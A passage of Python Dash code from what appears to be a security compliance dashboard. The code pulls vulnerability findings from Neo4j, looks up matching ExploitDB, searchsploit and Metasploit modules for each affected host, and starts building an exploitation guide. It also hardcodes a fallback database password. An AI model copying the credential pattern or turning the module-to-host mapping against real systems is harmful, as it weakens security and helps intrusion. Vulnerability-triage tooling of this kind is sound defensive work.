    scanner_summary = html.Div([
        html.Table([
            html.Thead(html.Tr([
                html.Th("Scanner", style={"color": "#8e9eb0", "fontSize": "11px", "padding": "6px 8px", "textAlign": "left"}),
                html.Th("Critical", style={"color": RED, "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
                html.Th("High", style={"color": ORANGE, "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
                html.Th("Medium", style={"color": YELLOW, "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
                html.Th("Low", style={"color": GREEN, "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
                html.Th("Info", style={"color": "#8e9eb0", "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
                html.Th("Total", style={"color": ACCENT, "fontSize": "11px", "padding": "6px 4px", "textAlign": "center"}),
            ], style={"borderBottom": f"2px solid {ACCENT}"})),
            html.Tbody(scanner_table_rows if scanner_table_rows else [
                html.Tr([html.Td("No scanner data yet", colSpan=7,
                    style={"color": "#555", "textAlign": "center", "padding": "20px"})])
            ]),
        ], style={"width": "100%", "borderCollapse": "collapse"}),
    ], style={"maxHeight": "300px", "overflowY": "auto"})

    # ── Exploit Intelligence ──────────────────────────────────
    exploit_items = []
    try:
        import os as _os5, subprocess
        from neo4j import GraphDatabase
        _pw5 = _os5.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        _d5 = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw5))
        with _d5.session() as _s5:
            # Pull CVEs with host IPs from Findings + Vulnerability + CVE enrichment
            _cves = _s5.run("""
                MATCH (f:Finding)
                WHERE f.cve IS NOT NULL AND toString(f.cve) STARTS WITH 'CVE-'
                OPTIONAL MATCH (v:Vulnerability {cve: f.cve})
                OPTIONAL MATCH (c:CVE {id: f.cve})
                OPTIONAL MATCH (h:Host)-[:RUNS_SERVICE|EXPOSES|HasService]->(:Service)
                              -[:HAS_FINDING|HAS_VULN]->(f)
                WITH f.cve AS cve,
                     coalesce(v.cvss, f.cvss) AS cvss,
                     coalesce(toString(f.severity), '') AS raw_sev,
                     coalesce(v.exploitable, f.exploitable, false) AS exploitable,
                     coalesce(c.kev, false) AS in_kev,
                     coalesce(c.epss, 0.0) AS epss,
                     coalesce(toString(f.source), 'unknown') AS source,
                     coalesce(f.name, '') AS name,
                     collect(DISTINCT coalesce(h.host, h.ip, '')) AS hosts
                RETURN DISTINCT cve, cvss, raw_sev, exploitable, in_kev, epss,
                       source, name, hosts
                ORDER BY
                  CASE WHEN exploitable = true THEN 0 ELSE 1 END,
                  CASE WHEN in_kev = true THEN 0 ELSE 1 END,
                  CASE
                    WHEN cvss IS NOT NULL THEN -1 * toFloat(cvss)
                    WHEN toLower(raw_sev) = 'critical' THEN -10
                    WHEN toLower(raw_sev) = 'high'     THEN -8
                    WHEN toLower(raw_sev) = 'medium'   THEN -5
                    ELSE -2
                  END
                LIMIT 20
            """).data()
        _d5.close()

        # ── Local ExploitDB CSV lookup (instant, no network) ─────
        _edb_csv = "/usr/share/exploitdb/files_exploits.csv"
        _edb_data = {}
        if _os5.path.isfile(_edb_csv):
            try:
                with open(_edb_csv, "r", errors="ignore") as _ef:
                    for line in _ef:
                        for cv in _cves:
                            cid = cv["cve"]
                            year_id = cid.replace("CVE-", "")  # e.g. "2015-5477"
                            if year_id in line or cid in line:
                                has_msf = "metasploit" in line.lower()
                                _edb_data.setdefault(cid, {"exploitdb": True, "msf": has_msf})
            except Exception:
                pass

        # ── Local searchsploit check (batch) ─────────────────────
        _ssploit_hits = set()
        try:
            cve_ids = [c["cve"].replace("CVE-", "") for c in _cves]
            for cid_short in cve_ids:
                result = subprocess.run(
                    ["searchsploit", "--cve", cid_short, "-w"],
                    capture_output=True, text=True, timeout=3,
                )
                if result.stdout and "Exploit Title" in result.stdout:
                    lines = [l for l in result.stdout.strip().split("\n")
                             if l.strip() and not l.startswith("-") and "Exploit Title" not in l
                             and "Shellcodes" not in l and "Papers" not in l]
                    if lines:
                        _ssploit_hits.add(f"CVE-{cid_short}")
        except Exception:
            pass

        # ── Local Metasploit module search ───────────────────────
        _msf_hits = set()
        _msf_base = "/usr/share/metasploit-framework/modules"
        if _os5.path.isdir(_msf_base):
            try:
                for cv in _cves:
                    cid = cv["cve"]
                    year_id = cid.replace("CVE-", "")
                    result = subprocess.run(
                        ["grep", "-rl", year_id, _msf_base],
                        capture_output=True, text=True, timeout=3,
                    )
                    if result.stdout.strip():
                        _msf_hits.add(cid)
            except Exception:
                pass

        # ── Build list items ─────────────────────────────────────
        for cv in _cves:
            cve_id = cv["cve"]
            cvss_val = cv.get("cvss")
            raw_sev = str(cv.get("raw_sev", "")).strip()
            exploitable = cv.get("exploitable", False)
            in_kev = cv.get("in_kev", False)
            epss = cv.get("epss", 0)
            source = cv.get("source", "—")
            hosts = [h for h in cv.get("hosts", []) if h]
            host_count = len(hosts)

            # Derive severity from CVSS first, then fall back to raw_sev
            if cvss_val is not None:
                c = float(cvss_val)
                sev = "Critical" if c >= 9.0 else "High" if c >= 7.0 else "Medium" if c >= 4.0 else "Low" if c >= 0.1 else "Info"
            elif raw_sev.lower() in ("critical", "high", "medium", "low", "info"):
                sev = raw_sev.capitalize()
            else:
                sev = "Medium"

            # Collect exploit sources from local data
            sources = []
            if in_kev:
                sources.append("CISA KEV")
            if exploitable:
                sources.append("Exploitable")
            if cve_id in _edb_data:
                sources.append("ExploitDB")
            if cve_id in _ssploit_hits:
                sources.append("SearchSploit")
            if cve_id in _msf_hits or _edb_data.get(cve_id, {}).get("msf"):
                sources.append("Metasploit")
            sources.append("NVD")  # all CVEs are in NVD

            sev_color = {"Critical": RED, "High": ORANGE, "Medium": YELLOW,
                         "Low": GREEN, "Info": "#8e9eb0"}.get(sev, "#8e9eb0")

            # Build badges for exploit sources
            source_badges = []
            EXPLOIT_SRCS = ("ExploitDB", "Metasploit", "SearchSploit", "Exploitable", "CISA KEV")
            for s in sources:
                is_red = s in EXPLOIT_SRCS
                source_badges.append(html.Span(s, style={
                    "fontSize": "9px", "fontWeight": "600",
                    "color": "#ff6b6b" if is_red else "#5baef5",
                    "background": "#ff6b6b15" if is_red else "#5baef515",
                    "padding": "2px 6px", "borderRadius": "8px",
                }))

            # Info line: CVSS · EPSS · hosts · scanner
            info_parts = []
            if cvss_val:
                info_parts.append(f"CVSS {cvss_val}")
            if epss and float(epss) > 0:
                info_parts.append(f"EPSS {float(epss)*100:.1f}%")
            # Show actual host IPs (up to 4)
            if hosts:
                shown = hosts[:4]
                extra = len(hosts) - 4
                host_str = ", ".join(shown)
                if extra > 0:
                    host_str += f" +{extra}"
                info_parts.append(f"🖥 {host_str}")
            info_parts.append(source)

            exploit_items.append(html.Div([
                # Left side: CVE + severity + info
                html.Div([
                    html.Div([
                        html.Span(cve_id, style={"fontWeight": "700", "color": "#e0e0e0", "fontSize": "12px"}),
                        html.Span(sev, style={
                            "fontSize": "9px", "color": sev_color, "fontWeight": "700",
                            "background": f"{sev_color}22", "padding": "1px 8px",
                            "borderRadius": "10px", "marginLeft": "6px",
                        }),
                    ], style={"display": "flex", "alignItems": "center"}),
                    html.Div(" · ".join(info_parts), style={
                        "fontSize": "9px", "color": "#555", "marginTop": "2px"}),
                ]),
                # Right side: exploit source badges
                html.Div(source_badges, style={
                    "display": "flex", "gap": "3px", "flexWrap": "wrap",
                    "justifyContent": "flex-end", "maxWidth": "55%"}),
            ], style={
                "display": "flex", "justifyContent": "space-between", "alignItems": "center",
                "padding": "6px 0", "borderBottom": "1px solid #1e2230",
            }))
    except Exception as _ex:
        import traceback
        traceback.print_exc()

    exploit_intel = html.Div([
        html.Div(exploit_items if exploit_items else [
            html.Div("No CVE data — run a scan first",
                     style={"color": "#555", "textAlign": "center", "padding": "40px"})
        ]),
    ], style={"maxHeight": "300px", "overflowY": "auto"})

    # Build meaningful subtitles
    score_sub = "NIST 800-53 Baseline" if score >= 50 else "Needs Improvement"
    # Count distinct scanners and critical findings
    scanner_count = len(scanner_rows) if scanner_rows else 0
    findings_sub = f"Across {scanner_count} scanner{'s' if scanner_count != 1 else ''}" if scanner_count else "No scanners detected"
    # Count critical POA&Ms
    poams_sub = f"{open_poams} action items pending"
    # Risk subtitle
    risk_sub = f"{risk_count} items under review" if risk_count else "No active risks"

    # ── Certification Tracker — live from CertTracker ──────────────────────
    cert_els = []
    try:
        from cyber_range.services.cert_tracker import get_tracker as _get_ct
        _ct  = _get_ct()
        _all = _ct.get_all_certifications()
        _STC = {
            "Not Started": "#8e9eb0",
            "In Progress": ORANGE,
            "Under Review": YELLOW,
            "Certified":   GREEN,
            "Active":      GREEN,
            "Lapsed":      RED,
        }
        for _c in _all:
            _st  = _c.get("status", "Not Started")
            _clr2 = _STC.get(_st, "#8e9eb0")
            _rd  = _c.get("readiness_score", 0)
            _ph  = (_c.get("phase") or "")
            _ev  = _c.get("evidence_count", 0)
            _cmt = _c.get("controls_met", 0)
            _ctt = _c.get("controls_total", 1) or 1
            cert_els.append(html.Div([
                html.Div([
                    html.Div([
                        html.Span("●", style={"color": _clr2, "fontSize": "12px",
                                              "marginRight": "6px"}),
                        html.Span(_c.get("name", _c["id"]),
                                  style={"fontSize": "12px", "fontWeight": "600",
                                         "color": "#e0e0e0"}),
                    ], style={"display": "flex", "alignItems": "center"}),
                    html.Span(_st, style={
                        "fontSize": "10px", "color": _clr2, "fontWeight": "600",
                        "background": f"{_clr2}22", "padding": "2px 8px",
                        "borderRadius": "10px",
                    }),
                ], style={"display": "flex", "justifyContent": "space-between",
                          "alignItems": "center", "marginBottom": "3px"}),
                html.Div([
                    dbc.Progress(
                        value=int(_rd),
                        color=("success" if _rd >= 80 else "warning" if _rd >= 50 else "danger"),
                        style={"height": "4px", "flex": "1", "backgroundColor": "#1a1d24",
                               "borderRadius": "4px"},
                    ),
                    html.Span(f"{_rd:.0f}%",
                              style={"fontSize": "9px", "color": _clr2,
                                     "marginLeft": "5px", "minWidth": "28px",
                                     "textAlign": "right"}),
                ], style={"display": "flex", "alignItems": "center",
                          "gap": "4px", "marginBottom": "2px"}),
                html.Div([
                    html.Span(_ph[:26] + ("…" if len(_ph) > 26 else "") if _ph else "Not started",
                              style={"fontSize": "9px", "color": "#666"}),
                    html.Span(f"{_cmt}/{_ctt} ctrl  ◦{_ev} ev",
                              style={"fontSize": "9px", "color": "#555",
                                     "marginLeft": "auto"}),
                ], style={"display": "flex", "justifyContent": "space-between"}),
            ], style={"padding": "7px 0", "borderBottom": "1px solid #1e2230",
                      "marginBottom": "3px"}))
        if not cert_els:
            cert_els = [html.Span("No certifications tracked.",
                                  style={"color": "#555", "fontSize": "11px"})]
    except Exception as _ce:
        cert_els = [html.Span(f"CertTracker error: {_ce}",
                              style={"color": RED, "fontSize": "10px",
                                     "fontFamily": "monospace"})]

    return (
        f"{score}%", str(open_findings), str(open_poams), str(risk_count),
        score_sub, findings_sub, poams_sub, risk_sub,
        gauge_fig, trends_fig, heatmap_fig, severity_fig,
        attack_surface, threat_summary,
        scanner_summary, exploit_intel,
        cert_els,
    )



def _mini_stat(label: str, value) -> html.Div:
    return html.Div([
        html.Div(str(value), style={"fontSize": "20px", "fontWeight": "800", "color": ACCENT}),
        html.Div(label, style={"fontSize": "10px", "color": "#8e9eb0"}),
    ], style={"textAlign": "center", "padding": "8px"})


def _feed_status(name: str, active: bool) -> html.Span:
    return html.Span([
        html.Span("●", style={"color": GREEN if active else RED, "fontSize": "8px"}),
        f" {name}",
    ], style={
        "fontSize": "10px", "color": "#8e9eb0",
        "background": "#1a1d24", "padding": "3px 8px", "borderRadius": "10px",
    })


# ======================================================================
# CALLBACK: Chart Drill-Down Modal
# ======================================================================

@callback(
    Output("grc-drill-modal", "is_open"),
    Output("grc-drill-title", "children"),
    Output("grc-drill-body", "children"),
    Input("grc-gauge-click", "n_clicks"),
    Input("grc-exec-trends", "clickData"),
    Input("grc-exec-heatmap", "clickData"),
    Input("grc-exec-severity", "clickData"),
    prevent_initial_call=True,
)
def _drill_down(gauge_clicks, trends_click, heatmap_click, severity_click):
    """Open a detailed drill-down modal when any chart is clicked."""
    import os as _os_d, subprocess
    from dash import ctx
    from neo4j import GraphDatabase

    triggered = ctx.triggered_id
    if not triggered:
        return False, "", html.Div()

    # ── Determine context from click source ──────────────────────
    title = "📋 Drill-Down Detail"
    neo_filter = ""
    filter_params = {}
    level_names = ["Very Low", "Low", "Medium", "High", "Very High"]

    if triggered == "grc-exec-trends" and trends_click:
        pt = trends_click["points"][0]
        click_date = str(pt.get("x", ""))
        # Parse Plotly date format back to YYYY-MM-DD
        from datetime import datetime as _dt
        parsed_date = click_date
        for fmt in ("%Y-%m-%d", "%b %d\n%Y", "%b %d, %Y", "%b %-d", "%b %d"):
            try:
                parsed_date = _dt.strptime(click_date.strip(), fmt).strftime("%Y-%m-%d")
                break
            except (ValueError, Exception):
                continue
        title = f"📈 Findings for {parsed_date}"
        neo_filter = "AND toString(date(datetime(f.last_seen))) = $target_date"
        filter_params["target_date"] = parsed_date

    elif triggered == "grc-exec-heatmap" and heatmap_click:
        pt = heatmap_click["points"][0]
        impact_label = pt.get("x", "")
        likelihood_label = pt.get("y", "")
        title = f"🔥 Risk: {likelihood_label} Likelihood × {impact_label} Impact"
        # Will apply post-query Python filter based on derived likelihood/impact
        filter_params["_hm_impact"] = impact_label
        filter_params["_hm_likelihood"] = likelihood_label

    elif triggered == "grc-exec-severity" and severity_click:
        pt = severity_click["points"][0]
        sev_label = pt.get("x", pt.get("label", ""))
        title = f"📊 {sev_label} Severity Findings"
        # Use CVSS-based bucketing in Cypher for proper derivation
        sev_ranges = {
            "critical": "AND (toFloat(toString(coalesce(f.cvss, v.cvss, -1))) >= 9.0 OR toLower(toString(coalesce(f.severity, ''))) = 'critical')",
            "high":     "AND ((toFloat(toString(coalesce(f.cvss, v.cvss, -1))) >= 7.0 AND toFloat(toString(coalesce(f.cvss, v.cvss, -1))) < 9.0) OR toLower(toString(coalesce(f.severity, ''))) = 'high')",
            "medium":   "AND ((toFloat(toString(coalesce(f.cvss, v.cvss, -1))) >= 4.0 AND toFloat(toString(coalesce(f.cvss, v.cvss, -1))) < 7.0) OR toLower(toString(coalesce(f.severity, ''))) = 'medium')",
            "low":      "AND ((toFloat(toString(coalesce(f.cvss, v.cvss, -1))) >= 0.1 AND toFloat(toString(coalesce(f.cvss, v.cvss, -1))) < 4.0) OR toLower(toString(coalesce(f.severity, ''))) = 'low')",
        }
        neo_filter = sev_ranges.get(sev_label.lower(), "")

    elif triggered == "grc-gauge-click" and gauge_clicks:
        title = "🎯 Overall Compliance Findings"
        # Show all findings for general overview

    # ── Query Neo4j ──────────────────────────────────────────────
    findings = []
    hm_impact = filter_params.pop("_hm_impact", None)
    hm_likelihood = filter_params.pop("_hm_likelihood", None)
    sev_post_filter = None

    # For severity clicks, build a Cypher-level filter using CVSS bucketing
    sev_where = ""
    if triggered == "grc-exec-severity" and severity_click:
        sev_label = severity_click["points"][0].get("x",
                    severity_click["points"][0].get("label", ""))
        sev_post_filter = sev_label.capitalize()
        neo_filter = ""  # Clear any other neo_filter set earlier
        sev_where = "WHERE derived_sev = $target_sev"
        filter_params["target_sev"] = sev_post_filter

    try:
        _pw_d = _os_d.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        _drv = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw_d))
        with _drv.session() as _sd:
            rows = _sd.run(f"""
                MATCH (h:Host)-[:RUNS_SERVICE|EXPOSES|HasService]->(:Service)
                      -[:HAS_FINDING|HAS_VULN]->(f:Finding)
                WHERE f.name IS NOT NULL {neo_filter}
                OPTIONAL MATCH (v:Vulnerability {{cve: f.cve}})
                OPTIONAL MATCH (c:CVE {{id: f.cve}})
                WITH f, h,
                     coalesce(v.cvss, f.cvss) AS cvss,
                     coalesce(v.exploitable, f.exploitable, false) AS exploitable,
                     coalesce(c.kev, false) AS in_kev,
                     coalesce(c.epss, 0.0) AS epss,
                     CASE
                       WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                            AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 9.0 THEN 'Critical'
                       WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                            AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 7.0 THEN 'High'
                       WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                            AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 4.0 THEN 'Medium'
                       WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                            AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 0.1 THEN 'Low'
                       WHEN toLower(toString(coalesce(f.severity, '')))
                            IN ['critical','high','medium','low','info'] THEN
                            toLower(toString(f.severity))
                       ELSE 'Info'
                     END AS derived_sev
                {sev_where}
                RETURN f.name AS name,
                       coalesce(f.cve, '') AS cve,
                       coalesce(toString(f.severity), '') AS raw_sev,
                       cvss, exploitable, in_kev, epss,
                       derived_sev,
                       coalesce(toString(f.source), 'unknown') AS source,
                       coalesce(f.description, '') AS description,
                       coalesce(h.host, h.ip, 'unknown') AS host_ip
                ORDER BY
                  CASE WHEN exploitable = true THEN 0 ELSE 1 END,
                  CASE WHEN cvss IS NOT NULL THEN -1*toFloat(cvss) ELSE 0 END
                LIMIT 300
            """, **filter_params).data()
            findings = rows
        _drv.close()
    except Exception:
        import traceback
        traceback.print_exc()

    # ── Helper: derive severity from a finding row ──────────────
    def _derive_sev(f):
        if f.get("derived_sev") and f["derived_sev"] != "":
            s = f["derived_sev"]
            return s.capitalize() if s.lower() in ("critical","high","medium","low","info") else "Info"
        c = float(f["cvss"]) if f["cvss"] is not None else None
        raw = f.get("raw_sev", "").lower().strip()
        if c is not None:
            return "Critical" if c >= 9 else "High" if c >= 7 else "Medium" if c >= 4 else "Low" if c >= 0.1 else "Info"
        return raw.capitalize() if raw in ("critical", "high", "medium", "low", "info") else "Info"

    # ── Post-query heatmap filter (Python-side) ─────────────────
    if hm_impact and hm_likelihood:
        level_map = {"Very Low": 0, "Low": 1, "Medium": 2, "High": 3, "Very High": 4}
        target_imp = level_map.get(hm_impact)
        target_lik = level_map.get(hm_likelihood)
        if target_imp is not None and target_lik is not None:
            def _hm_match(f):
                c = float(f["cvss"]) if f["cvss"] is not None else None
                raw = f.get("raw_sev", "").lower().strip()
                expl = f.get("exploitable", False)
                epss = float(f["epss"]) if f["epss"] else 0
                # Impact from CVSS/severity
                if c is not None:
                    imp = 4 if c >= 9 else 3 if c >= 7 else 2 if c >= 4 else 1 if c >= 0.1 else 0
                else:
                    imp = {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(raw, 0)
                # Likelihood from exploitability/EPSS
                if expl and epss >= 0.5: lik = 4
                elif expl or epss >= 0.3: lik = 3
                elif epss >= 0.1: lik = 2
                elif epss > 0 or raw in ("high", "critical"): lik = 1
                else: lik = 0
                return imp == target_imp and lik == target_lik
            findings = [f for f in findings if _hm_match(f)][:200]

    if not findings:
        return True, title, html.Div(
            "No findings match this selection.",
            style={"color": "#555", "textAlign": "center", "padding": "40px"},
        )

    # ── Local ExploitDB CSV lookup ──────────────────────────────
    _edb_csv = "/usr/share/exploitdb/files_exploits.csv"
    edb_cves = set()
    msf_cves = set()
    cve_set = {f["cve"] for f in findings if f.get("cve") and f["cve"].startswith("CVE-")}
    if _os_d.path.isfile(_edb_csv) and cve_set:
        try:
            with open(_edb_csv, "r", errors="ignore") as ef:
                for line in ef:
                    for cid in cve_set:
                        if cid.replace("CVE-", "") in line or cid in line:
                            edb_cves.add(cid)
                            if "metasploit" in line.lower():
                                msf_cves.add(cid)
        except Exception:
            pass

    # ── SearchSploit batch ──────────────────────────────────────
    ssploit_cves = set()
    for cid in list(cve_set)[:15]:
        try:
            r = subprocess.run(
                ["searchsploit", "--cve", cid.replace("CVE-", ""), "-w"],
                capture_output=True, text=True, timeout=3,
            )
            if r.stdout and "Exploit Title" in r.stdout:
                lines = [l for l in r.stdout.strip().split("\n")
                         if l.strip() and not l.startswith("-")
                         and "Exploit Title" not in l]
                if lines:
                    ssploit_cves.add(cid)
        except Exception:
            pass

    # ── Metasploit module filesystem search ─────────────────────
    _MSF_PATH = "/usr/share/metasploit-framework/modules"
    _MSF_TYPES = {
        "exploits":  "exploit",
        "auxiliary": "auxiliary",
        "post":      "post",
        "encoders":  "encoder",
        "evasion":   "evasion",
        "payloads":  "payload",
        "nops":      "nop",
    }
    _MSF_TYPE_DESC = {
        "exploit":   "Delivers the attack payload to gain access to the target system",
        "auxiliary":  "Performs scanning, enumeration, and information gathering without exploitation",
        "post":       "Runs after gaining access — dumps creds, escalates privs, pivots",
        "encoder":    "Obfuscates payloads to evade antivirus and IDS detection",
        "evasion":    "Generates AV-evasive executables and stagers",
        "payload":    "The code that runs on the target after successful exploitation",
        "nop":        "Padding for payload alignment, helps exploit reliability",
    }

    def _parse_msf_path(fpath):
        """Parse a Metasploit module .rb file path into module info."""
        rel = fpath.replace(_MSF_PATH + "/", "")
        parts = rel.split("/")
        mod_dir = parts[0] if parts else ""
        mod_type = _MSF_TYPES.get(mod_dir, mod_dir)
        mod_name = rel.replace(mod_dir + "/", "").replace(".rb", "")
        return {
            "type": mod_type,
            "path": f"{mod_type}/{mod_name}",
            "desc": _MSF_TYPE_DESC.get(mod_type, ""),
        }

    msf_modules = {}  # CVE → list of {type, path, desc}

    # 1) Search by CVE ID in module files
    for cid in list(cve_set)[:20]:
        try:
            r = subprocess.run(
                ["grep", "-rl", "--include=*.rb", cid, _MSF_PATH],
                capture_output=True, text=True, timeout=8,
            )
            if r.stdout:
                for fpath in r.stdout.strip().split("\n"):
                    if fpath.strip():
                        msf_modules.setdefault(cid, []).append(_parse_msf_path(fpath.strip()))
                        msf_cves.add(cid)
        except Exception:
            pass

    # 2) Search by service keyword from finding names → find modules by service dir
    _SVC_KEYWORDS = {
        "ssh": ["ssh"], "http": ["http", "https", "web", "apache", "nginx"],
        "ftp": ["ftp", "vsftpd", "proftpd"], "smb": ["smb", "samba", "cifs"],
        "smtp": ["smtp", "mail", "postfix"], "mysql": ["mysql", "mariadb"],
        "postgres": ["postgres", "postgresql"], "rdp": ["rdp", "remote desktop"],
        "vnc": ["vnc"], "telnet": ["telnet"], "dns": ["dns", "bind"],
        "snmp": ["snmp"], "ldap": ["ldap"], "nfs": ["nfs"],
        "imap": ["imap"], "pop3": ["pop3"], "redis": ["redis"],
        "mongodb": ["mongodb", "mongo"], "oracle": ["oracle"],
    }
    _svc_module_cache = {}  # service_key → list of module dicts

    def _get_svc_modules(svc_key):
        """Get modules for a service, with caching."""
        if svc_key in _svc_module_cache:
            return _svc_module_cache[svc_key]
        mods = []
        for mod_dir in ["exploits", "auxiliary", "post"]:
            svc_dir = _os_d.path.join(_MSF_PATH, mod_dir)
            try:
                r = subprocess.run(
                    ["find", svc_dir, "-type", "f", "-name", "*.rb",
                     "-path", f"*/{svc_key}/*"],
                    capture_output=True, text=True, timeout=5,
                )
                if r.stdout:
                    for fpath in r.stdout.strip().split("\n"):
                        if fpath.strip():
                            mods.append(_parse_msf_path(fpath.strip()))
            except Exception:
                pass
        # Also search multi/ dirs for the service
        for mod_dir in ["exploits", "auxiliary"]:
            try:
                multi_dir = _os_d.path.join(_MSF_PATH, mod_dir, "multi")
                if _os_d.path.isdir(multi_dir):
                    r = subprocess.run(
                        ["find", multi_dir, "-type", "f", "-name", "*.rb",
                         "-path", f"*/{svc_key}/*"],
                        capture_output=True, text=True, timeout=5,
                    )
                    if r.stdout:
                        for fpath in r.stdout.strip().split("\n"):
                            if fpath.strip():
                                mods.append(_parse_msf_path(fpath.strip()))
            except Exception:
                pass
        _svc_module_cache[svc_key] = mods
        return mods

    # Map findings to service-based modules
    for f in findings:
        cid = f.get("cve", "")
        fname_lower = f.get("name", "").lower()
        if cid in msf_modules and len(msf_modules[cid]) >= 6:
            continue  # Already have enough CVE-matched modules
        for svc_key, keywords in _SVC_KEYWORDS.items():
            if any(kw in fname_lower for kw in keywords):
                svc_mods = _get_svc_modules(svc_key)
                if svc_mods and cid:
                    existing_paths = {m["path"] for m in msf_modules.get(cid, [])}
                    for m in svc_mods[:8]:
                        if m["path"] not in existing_paths:
                            msf_modules.setdefault(cid, []).append(m)
                            msf_cves.add(cid)
                break  # Only match first service

    # ── Categorize findings by severity ─────────────────────────
    SEV_ORDER = ["Critical", "High", "Medium", "Low", "Info"]
    SEV_COLORS_MAP = {"Critical": RED, "High": ORANGE, "Medium": YELLOW,
                      "Low": GREEN, "Info": "#8e9eb0"}
    categorized = {s: [] for s in SEV_ORDER}
    hosts_by_sev = {s: set() for s in SEV_ORDER}

    for f in findings:
        cvss = float(f["cvss"]) if f["cvss"] is not None else None
        raw = f["raw_sev"].lower().strip()
        # Derive severity from CVSS first
        if cvss is not None:
            sev = "Critical" if cvss >= 9 else "High" if cvss >= 7 else "Medium" if cvss >= 4 else "Low" if cvss >= 0.1 else "Info"
        elif raw in ("critical", "high", "medium", "low", "info"):
            sev = raw.capitalize()
        else:
            sev = "Info"

        categorized[sev].append(f)
        hosts_by_sev[sev].add(f["host_ip"])

    # ── Mitigation knowledge base ───────────────────────────────
    MITIGATIONS = {
        "Critical": "Patch immediately. Isolate affected systems. Invoke incident response if exploitable.",
        "High": "Prioritize patching within 7 days. Review network segmentation around affected hosts.",
        "Medium": "Schedule patching within 30 days. Monitor for exploitation attempts.",
        "Low": "Include in next maintenance window. Document and track.",
        "Info": "Informational only. Review during regular audits.",
    }
    THREAT_IMPACT = {
        "Critical": "Active exploitation in the wild. Immediate threat to confidentiality, integrity, and availability.",
        "High": "Known exploit code available. High probability of exploitation if exposed.",
        "Medium": "Moderate risk. May require specific conditions for exploitation.",
        "Low": "Low immediate threat. Unlikely to be exploited without additional vulnerabilities.",
        "Info": "No direct exploitation risk. Useful for hardening posture.",
    }

    # ── Build the modal body ────────────────────────────────────
    sections = []
    for sev in SEV_ORDER:
        items = categorized[sev]
        if not items:
            continue

        color = SEV_COLORS_MAP[sev]
        hosts = sorted(hosts_by_sev[sev])
        unique_findings = {}
        for f in items:
            key = f["name"]
            if key not in unique_findings:
                unique_findings[key] = {**f, "hosts": set(), "count": 0}
            unique_findings[key]["hosts"].add(f["host_ip"])
            unique_findings[key]["count"] += 1

        # Build finding cards
        finding_cards = []
        for fname, fdata in list(unique_findings.items())[:20]:
            cve_id = fdata.get("cve", "")
            cvss_v = fdata.get("cvss")
            epss_v = fdata.get("epss", 0)
            desc = fdata.get("description", "")[:200]
            f_hosts = sorted(fdata["hosts"])

            # Exploit source badges — all clickable
            badges = []
            cve_num = cve_id.replace("CVE-", "") if cve_id else ""
            if fdata.get("in_kev"):
                badges.append(("🔴 CISA KEV", True,
                    f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog/search?search_api_fulltext={cve_id}"))
            if fdata.get("exploitable"):
                badges.append(("⚡ Exploitable", True,
                    f"https://www.exploit-db.com/search?cve={cve_num}" if cve_num else None))
            if cve_id in edb_cves:
                badges.append(("ExploitDB", True,
                    f"https://www.exploit-db.com/search?cve={cve_num}"))
            if cve_id in ssploit_cves:
                badges.append(("SearchSploit", True,
                    f"https://www.exploit-db.com/search?cve={cve_num}"))
            if cve_id in msf_cves:
                badges.append(("Metasploit", True,
                    f"https://www.rapid7.com/db/?q={cve_id}&type=module"))
            if cve_id:
                badges.append(("NVD", False,
                    f"https://nvd.nist.gov/vuln/detail/{cve_id}"))

            badge_spans = []
            for b in badges:
                label, is_hot = b[0], b[1]
                url = b[2] if len(b) > 2 and b[2] else None
                base_style = {
                    "fontSize": "9px", "fontWeight": "600",
                    "padding": "2px 6px", "borderRadius": "8px",
                    "textDecoration": "none", "display": "inline-block",
                    "transition": "all 0.2s",
                }
                if url:
                    base_style.update({
                        "color": "#ff6b6b" if is_hot else "#5baef5",
                        "background": "#ff6b6b20" if is_hot else "#5baef520",
                        "border": f"1px solid {'#ff6b6b55' if is_hot else '#5baef555'}",
                        "cursor": "pointer",
                    })
                    badge_spans.append(html.A(
                        label, href=url, target="_blank", style=base_style))
                else:
                    base_style.update({
                        "color": "#ff6b6b" if is_hot else "#5baef5",
                        "background": "#ff6b6b15" if is_hot else "#5baef515",
                    })
                    badge_spans.append(html.Span(label, style=base_style))

            # Info metrics
            metrics = []
            if cvss_v:
                metrics.append(html.Span(f"CVSS {cvss_v}", style={
                    "color": color, "fontWeight": "700", "fontSize": "11px",
                }))
            if epss_v and float(epss_v) > 0:
                metrics.append(html.Span(f"EPSS {float(epss_v)*100:.1f}%", style={
                    "color": "#8e9eb0", "fontSize": "11px",
                }))
            metrics.append(html.Span(f"{fdata['count']} occurrence{'s' if fdata['count']>1 else ''}",
                style={"color": "#555", "fontSize": "11px"}))

            # ── MITRE ATT&CK Kill Chain Exploitation Guide ────────
            host_list = ", ".join(f_hosts[:4])
            if len(f_hosts) > 4:
                host_list += f" (+{len(f_hosts)-4} more)"
            tgt = f_hosts[0]
            has_msf = cve_id in msf_cves
            has_edb = cve_id in edb_cves or cve_id in ssploit_cves
            cve_mods = msf_modules.get(cve_id, [])

            # ── Helper: render a Metasploit module card ──────────
            def _msf_card(mod, target_ip):
                """Render a single Metasploit module with exec description."""
                _type_icon = {
                    "exploit": "💥", "auxiliary": "🔍", "post": "🏴",
                    "encoder": "🔧", "evasion": "🛡️", "payload": "📦", "nop": "⚙️",
                }
                _type_color = {
                    "exploit": "#ff4444", "auxiliary": "#00d4ff", "post": "#9c27b0",
                    "encoder": "#ff8c00", "evasion": "#4caf50", "payload": "#ffd700", "nop": "#8e9eb0",
                }
                icon = _type_icon.get(mod["type"], "📦")
                clr = _type_color.get(mod["type"], "#aaa")
                return html.Div([
                    html.Div([
